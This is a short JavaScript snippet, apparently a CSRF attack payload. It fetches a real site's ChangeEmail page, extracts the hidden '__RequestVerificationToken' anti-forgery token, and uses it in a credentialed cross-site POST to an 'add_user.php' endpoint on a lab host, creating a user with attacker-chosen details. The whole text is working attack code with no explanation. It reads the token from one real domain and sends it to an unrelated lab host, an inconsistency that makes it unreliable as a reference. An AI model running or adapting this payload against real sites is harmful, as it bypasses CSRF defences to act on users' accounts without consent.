var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
           var htmlsource = xhr.responseText
           // some operations
           parser = new DOMParser().parseFromString(htmlsource, "text/html");
           token = parser.getElementsByName('__RequestVerificationToken')[0];
           token_value = token.getAttribute('value');
           alert(token_value)
           var url =  "http://3.csrf.labs/add_user.php";
           var params =  "name=l33t&surname=Smdfith&email=malfdice23%40lol.com&role=USER&CSRFToken="+token_value+"&submit=";
           var CSRF = new XMLHttpRequest();
           CSRF.open("POST", url, true);
           CSRF.withCredentials = 'true'; //IMPORTANT MUST!!
           CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
           CSRF.send(params);

        }
};

xhr.open('GET', 'https://accounts.autoscout24.com/ChangeEmail', true);
xhr.send();





